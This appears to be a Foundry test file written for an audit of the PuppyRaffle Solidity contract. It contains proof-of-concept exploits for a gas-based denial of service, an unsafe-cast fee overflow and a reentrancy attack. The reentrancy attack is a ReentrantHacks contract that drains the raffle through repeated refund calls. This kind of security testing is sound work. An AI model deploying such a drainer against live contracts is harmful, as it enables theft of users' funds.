// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    function test_DoS() public {
        vm.txGasPrice(1);

        address[] memory players = new address[](20);
        for (uint256 i = 0; i < players.length; i++) {
            players[i] = address(uint160(uint(i)));
        }

        uint fundToSend = players.length * entranceFee;
        vm.deal(playerOne, fundToSend);
        vm.prank(playerOne);

        uint gasBefore = gasleft();
        puppyRaffle.enterRaffle{value: fundToSend}(players);
        uint gasAfter = gasleft();
        console.log("Gass Used on First 20 Users: ", (gasBefore - gasAfter) * tx.gasprice);

        players = new address[](20);
        for (uint256 i = 0; i < players.length; i++) {
            players[i] = address(uint160(uint(i + 21)));
        }

        fundToSend = players.length * entranceFee;
        vm.deal(playerOne, fundToSend);
        vm.prank(playerOne);

        gasBefore = gasleft();
        puppyRaffle.enterRaffle{value: fundToSend}(players);
        gasAfter = gasleft();
        console.log("Gass Used on Second 20 Users: ", (gasBefore - gasAfter) * tx.gasprice);   
    }

    function test_reentrancy() public {
        // Get the entrance fees
        uint entranceFee = puppyRaffle.entranceFee();

        // get in more users
        address[] memory players = new address[](20);
        for (uint256 i = 0; i < players.length; i++) {
            players[i] = address(uint160(uint(i)));
        }
        uint FundToSend = players.length * entranceFee;
        vm.deal(playerOne, FundToSend);
        vm.prank(playerOne);
        puppyRaffle.enterRaffle{value: FundToSend}(players);

        // checks
        console.log("PuppyRaffle Balance Before Hack: ", address(puppyRaffle).balance);

        // start reentrant
        ReentrantHacks hacker = new ReentrantHacks(puppyRaffle);
        vm.deal(address(hacker), entranceFee);
        hacker.HackIt{value: entranceFee}();

        // checks
        console.log("PuppyRaffle Balance Before Hack: ", address(puppyRaffle).balance);
        console.log("Hacker Contract Balance: ", address(hacker).balance);
    }

    function test_unsafe_cast_overflow() public {
        // add players
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
                
        // skip time and select winner
        skip(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration() + 1);
        puppyRaffle.selectWinner();
        uint totalFeesBefore = puppyRaffle.totalFees(); 
        console.log("Total Fees collected on First Raffle: ", totalFeesBefore);

        // add another 89 players
        players = new address[](89);
        for (uint256 i = 0; i < players.length; i++) {
            players[i] = address(uint160(uint(i)));
        }      
        puppyRaffle.enterRaffle{value: entranceFee * 89}(players); 

        // skip time and select winner
        skip(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration() + 1);
        puppyRaffle.selectWinner(); 
        uint totalFeesAfter = puppyRaffle.totalFees();
        console.log("Total Fees collected on Second Raffle: ", totalFeesAfter);
        console.log("PuppyRaffle Balance: ", address(puppyRaffle).balance);

        // we're also unable to withdraw the fees due to 
        // strict equality (incorrect assumption of actual balance and actual fees collected)
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }


}

contract ReentrantHacks {

    PuppyRaffle puppyRaffle;
    uint EntranceFees;
    uint ThisAddressIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        EntranceFees = _puppyRaffle.entranceFee();
    }

    function HackIt() public payable {
        address[] memory player = new address[](1);
        player[0] = address(this);
        puppyRaffle.enterRaffle{value: EntranceFees}(player);

        ThisAddressIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(ThisAddressIndex);
    }
    receive() external payable {
        if (address(puppyRaffle).balance >= EntranceFees) {
            puppyRaffle.refund(ThisAddressIndex);
        }
    }

}